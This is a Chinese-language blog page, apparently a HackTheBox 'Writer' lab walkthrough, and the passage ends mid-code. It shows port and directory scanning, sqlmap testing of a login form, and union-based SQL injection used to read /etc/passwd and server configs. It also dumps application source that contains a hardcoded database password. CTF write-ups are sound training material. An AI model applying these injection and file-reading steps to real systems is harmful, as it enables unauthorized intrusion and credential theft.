@@ -1,0 +1,552 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="yougar">
+  <meta name="keywords" content="">
+  <meta name="description" content="信息收集1sudo nmap -sC -sV writer.htb  爆破目录信息 1gobuster dir  -u http:&#x2F;&#x2F;writer.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt   获得一个&#x2F;administrative目录，访问该目录  输入admin&#x2F;admin进行登录，xray报una">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Writer通关记录">
+<meta property="og:url" content="http://yougar0.github.io/2021/11/01/HTB-Writer%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="go hacking">
+<meta property="og:description" content="信息收集1sudo nmap -sC -sV writer.htb  爆破目录信息 1gobuster dir  -u http:&#x2F;&#x2F;writer.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt   获得一个&#x2F;administrative目录，访问该目录  输入admin&#x2F;admin进行登录，xray报una">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-3.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-0.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-1.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-2.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-4.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-5.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-6.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-7.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-8.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-11.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-12.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-13.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-14.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-17.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-18.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-20.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-21.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-23.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-25.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-26.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-27.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-28.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-29.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-31.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-32.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-33.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-34.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-35.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-36.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-37.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-38.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-40.png">
+<meta property="og:image" content="http://yougar0.github.io/images/pasted-41.png">
+<meta property="article:published_time" content="2021-11-02T02:59:00.000Z">
+<meta property="article:modified_time" content="2021-11-02T11:37:26.760Z">
+<meta property="article:author" content="yougar">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://yougar0.github.io/images/pasted-3.png">
+  
+  <title>HTB-Writer通关记录 - go hacking</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/ir-black.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yougar0.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Go Hacking</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="HTB-Writer通关记录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-01 22:59" pubdate>
+        2021年11月1日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      15k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      48 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HTB-Writer通关记录</h1>
+            
+            <div class="markdown-body">
+              <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo nmap -sC -sV writer.htb<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/images/pasted-3.png" srcset="/img/loading.gif" lazyload alt="upload successful"><br>爆破目录信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gobuster dir  -u http://writer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/images/pasted-0.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>获得一个/administrative目录，访问该目录</p>
+<p><img src="/images/pasted-1.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>输入admin/admin进行登录，xray报uname字段存在SQL时间盲注漏洞。</p>
+<p><img src="/images/pasted-2.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>sqlmap检查一下，看是否存在其他类型的注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u http://writer.htb/administrative --data=<span class="hljs-string">&quot;uname=admin&amp;password=admin&quot;</span> <br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/images/pasted-4.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>发现存在联合查询注入类型。</p>
+<p>使用联合查询类型手工读取/etc/passwd</p>
+<p><img src="/images/pasted-5.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<p>80端口开放的是apache，因此我们这里尝试读取apache的网站配置文件路径/etc/apache2/sites-enabled/000-default.conf</p>
+<p><img src="/images/pasted-6.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs conf"># Virtual host configuration for writer.htb domain<br>&lt;VirtualHost *:80&gt;<br>        ServerName writer.htb<br>        ServerAdmin admin@writer.htb<br>        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi<br>        &lt;Directory /var/www/writer.htb&gt;<br>                Order allow,deny<br>                Allow from all<br>        &lt;/Directory&gt;<br>        Alias /static /var/www/writer.htb/writer/static<br>        &lt;Directory /var/www/writer.htb/writer/static/&gt;<br>                Order allow,deny<br>                Allow from all<br>        &lt;/Directory&gt;<br>        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log<br>        LogLevel warn<br>        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined<br>&lt;/VirtualHost&gt;<br><br># Virtual host configuration for dev.writer.htb subdomain<br># Will enable configuration after completing backend development<br># Listen 8080<br>#&lt;VirtualHost 127.0.0.1:8080&gt;<br>#	ServerName dev.writer.htb<br>#	ServerAdmin admin@writer.htb<br>#<br>        # Collect static for the writer2_project/writer_web/templates<br>#	Alias /static /var/www/writer2_project/static<br>#	&lt;Directory /var/www/writer2_project/static&gt;<br>#		Require all granted<br>#	&lt;/Directory&gt;<br>#<br>#	&lt;Directory /var/www/writer2_project/writerv2&gt;<br>#		&lt;Files wsgi.py&gt;<br>#			Require all granted<br>#		&lt;/Files&gt;<br>#	&lt;/Directory&gt;<br>#<br>#	WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env<br>#	WSGIProcessGroup writer2_project<br>#	WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py<br>#        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log<br>#        LogLevel warn<br>#        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined<br>#<br>#&lt;/VirtualHost&gt;<br># vim: syntax=apache ts=4 sw=4 sts=4 sr noet<br></code></pre></div></td></tr></table></figure>
+
+<p>通过配置文件，我们得知服务端是使用python编写，服务端路径为/var/www/writer.htb/，因此我们尝试读取服务端代码，进行代码审计查找漏洞。</p>
+<p>读取<code>/var/www/writer.htb/writer/__init__.py</code></p>
+<p><img src="/images/pasted-7.png" srcset="/img/loading.gif" lazyload alt="upload successful"></p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, redirect, url_for, request, render_template<br><span class="hljs-keyword">from</span> mysql.connector <span class="hljs-keyword">import</span> errorcode<br><span class="hljs-keyword">import</span> mysql.connector<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> PIL<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, UnidentifiedImageError<br><span class="hljs-keyword">import</span> hashlib<br><br>app = Flask(__name__,static_url_path=<span class="hljs-string">&#x27;&#x27;</span>,static_folder=<span class="hljs-string">&#x27;static&#x27;</span>,template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br><span class="hljs-comment">#Define connection for database</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connections</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        connector = mysql.connector.connect(user=<span class="hljs-string">&#x27;admin&#x27;</span>, password=<span class="hljs-string">&#x27;ToughPasswordToCrack&#x27;</span>, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, database=<span class="hljs-string">&#x27;writer&#x27;</span>)<br>        <span class="hljs-keyword">return</span> connector<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-keyword">if</span> err.errno == errorcode.ER_ACCESS_DENIED_ERROR:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Something is wrong with your db user name or password!&quot;</span>)<br>        <span class="hljs-keyword">elif</span> err.errno == errorcode.ER_BAD_DB_ERROR:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database does not exist&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Another exception, returning!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;Connection to DB is ready!&#x27;</span>)<br><br><span class="hljs-comment">#Define homepage</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home_page</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    cursor = connector.cursor()<br>    sql_command = <span class="hljs-string">&quot;SELECT * FROM stories;&quot;</span><br>    cursor.execute(sql_command)<br>    results = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog/blog.html&#x27;</span>, results=results)<br><br><span class="hljs-comment">#Define about page</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/about&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">about</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog/about.html&#x27;</span>)<br><br><span class="hljs-comment">#Define contact page</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/contact&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">contact</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog/contact.html&#x27;</span>)<br><br><span class="hljs-comment">#Define blog posts</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/blog/post/&lt;id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">blog_post</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    cursor = connector.cursor()<br>    cursor.execute(<span class="hljs-string">&quot;SELECT * FROM stories WHERE id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>    results = cursor.fetchall()<br>    sql_command = <span class="hljs-string">&quot;SELECT * FROM stories;&quot;</span><br>    cursor.execute(sql_command)<br>    stories = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog/blog-single.html&#x27;</span>, results=results, stories=stories)<br><br><span class="hljs-comment">#Define dashboard for authenticated users</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dashboard</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;dashboard.html&#x27;</span>)<br><br><span class="hljs-comment">#Define stories page for dashboard and edit/delete pages</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/stories&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">stories</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    cursor = connector.cursor()<br>    sql_command = <span class="hljs-string">&quot;Select * From stories;&quot;</span><br>    cursor.execute(sql_command)<br>    results = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;stories.html&#x27;</span>, results=results)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/stories/add&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_story</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">if</span> request.files[<span class="hljs-string">&#x27;image&#x27;</span>]:<br>            image = request.files[<span class="hljs-string">&#x27;image&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image.filename:<br>                path = os.path.join(<span class="hljs-string">&#x27;/var/www/writer.htb/writer/static/img/&#x27;</span>, image.filename)<br>                image.save(path)<br>                image = <span class="hljs-string">&quot;/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image.filename)<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;File extensions must be in .jpg!&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>, error=error)<br><br>        <span class="hljs-keyword">if</span> request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>):<br>            image_url = request.form.get(<span 